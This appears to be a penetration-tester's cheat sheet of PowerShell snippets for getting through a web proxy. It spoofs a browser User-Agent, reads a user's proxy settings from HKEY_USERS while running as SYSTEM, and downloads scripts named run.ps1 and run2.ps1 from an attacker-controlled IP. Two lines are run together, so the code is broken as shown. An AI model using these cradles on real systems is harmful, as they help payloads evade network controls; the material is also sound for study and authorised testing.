# Proxies
## Remap reg hive
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
```

## Change UA of webclient
```
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

## Get Proxy settings as SYSTEM
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}

$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient$wc.DownloadString("http://192.168.119.120/run2.ps1")
```
